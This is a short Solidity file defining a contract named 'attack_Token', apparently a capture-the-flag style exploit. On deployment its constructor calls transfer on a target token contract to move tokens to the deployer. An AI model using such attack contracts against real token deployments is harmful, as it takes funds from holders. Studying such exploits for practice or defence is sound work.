// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


interface Itoken{
    function transfer(address , uint ) external returns (bool);
    function balanceOf(address ) external view returns (uint );
}

contract attack_Token {
    address target;
    constructor(address _target){
        target = _target;
        Itoken(target).transfer(msg.sender,1);
    }

    function returnaddress() public view returns (address){
        return address (Itoken(target));
    }
}
